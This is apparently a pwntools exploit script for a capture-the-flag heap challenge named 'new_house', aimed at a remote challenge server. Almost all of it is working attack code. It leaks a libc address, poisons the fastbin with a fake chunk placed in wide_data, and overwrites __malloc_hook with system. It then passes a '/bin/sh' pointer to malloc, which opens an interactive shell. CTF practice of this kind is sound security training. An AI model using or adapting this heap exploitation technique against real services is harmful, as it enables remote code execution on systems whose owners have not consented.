#!/usr/bin/env python3

'''
intended way (not this): house of gods

malloc takes only valid chunks by checking chunk size in the fastbin: https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/security_checks (see memory corruption (fast))
create fake chunk to attack fastbin: bypass size check when malloc is called by creating a fake chunk in wide_data,
then overwriting malloc_hook with system.
'''

from pwn import *

exe = ELF("./new_house_patched")
libc = ELF("./libc.so.6")

context.binary = exe

# split tmux pane
context.terminal = ["tmux", "splitw", "-vf","-p", "70"]

context.log_level = "debug"


if args.LOCAL:
    r = gdb.debug(exe.path, gdbscript='''
        b design_room
        b *add_room + 188
		b *delete_room + 195
                  ''')
elif args.PROCESS:
    r = process([exe.path])
else:
    r = remote("flu.xxx", 10170)

ru = lambda *x, **y: r.recvuntil(*x, **y)
rl = lambda *x, **y: r.recvline(*x, **y)
rc = lambda *x, **y: r.recv(*x, **y)
sla = lambda *x, **y: r.sendlineafter(*x, **y)
sa = lambda *x, **y: r.sendafter(*x, **y)
sl = lambda *x, **y: r.sendline(*x, **y)
sn = lambda *x, **y: r.send(*x, **y)

room_idx = 0

def add(roomname, roomsize):
	global room_idx 
	sl("1") 
	sla("roomname? ", roomname) 
	sla("roomsize? ", roomsize)

	room_idx += 1
	return room_idx - 1


def delete(roomnumber):
    sl("2")
    sla("roomnumber? ", roomnumber)


def design(roomnumber, data):
    sl("3")
    sla("roomnumber? ", roomnumber)
    sla("What goes into the room? ", data)


def show():
    sl("4")


def main(): 
	ru("ground: ") 
	leak = bytes.fromhex(rl().strip().decode()[2:]) 
	print(leak.hex()) 
	libc.address = int(leak.hex(), 16) # fake chunk 
	fake_chunk = libc.address + 0x3aabd5
	print(hex(fake_chunk))
	chunk = add("aaaa", "104") # 0x68 = size
	print(chunk) 


	delete("0") # goes to fastbin


	# fake chunk: make the fd point to a stucture where: 0x10 bytes (metadata) + 0x7f (size)
	design(str(chunk), p64(fake_chunk - 8)) # overwrite fd with fake_chunk (wide data + 301)

   
    # malloc will take the fake chunk (since the structure of metadata + size is correct: size = 0x71)
	# chunk crafted in wide_data + 301: 0x10 bytes of random things = previous chunk size + current chunk size (= 0x7f), (this size field is another 0x16 bytes long)! 

	add("b", "104") # 0x68 -> malloc takes the chunk freed and edited previously 
	overwrite_chunk = add("c", "104") # malloc takes the fake chunk crafted in wide_data

	# now i can rewrite the address pointed by malloc_hook since the crafted chunk is big enough to reach it
	design(str(overwrite_chunk), b"A" * 0x13 + p64(libc.sym.system)) # addr pointed by overwrite_chunk + 0x13 = malloc_hook
	binsh = 0x1728d5 + libc.address
	add("c", str(binsh)) # give binsh to malloc (which now points to system!)
	r.interactive()


if __name__ == "__main__":
    main()

